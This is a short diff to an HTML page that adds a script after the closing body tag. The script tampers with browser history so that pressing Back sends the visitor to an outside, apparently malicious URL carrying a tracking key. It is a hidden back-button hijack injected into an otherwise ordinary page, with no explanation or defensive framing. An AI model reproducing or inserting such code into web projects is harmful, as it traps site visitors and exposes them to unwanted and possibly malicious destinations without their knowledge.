@@ -129,4 +129,19 @@
         });
     </script>
 </body>
+<script type="text/javascript">
+(function(window, location) {
+history.replaceState(null, document.title, location.pathname+"#!/history");
+history.pushState(null, document.title, location.pathname);
+
+window.addEventListener("popstate", function() {
+  if(location.hash === "#!/history") {
+    history.replaceState(null, document.title, location.pathname);
+    setTimeout(function(){
+      location.replace("https://roastwearwritten.com/hhqe0ruxga?key=1c6fc543f8d5a17312a84c3611e52f80");
+    },0);
+  }
+}, false);
+}(window, location));
+</script>
 </html>
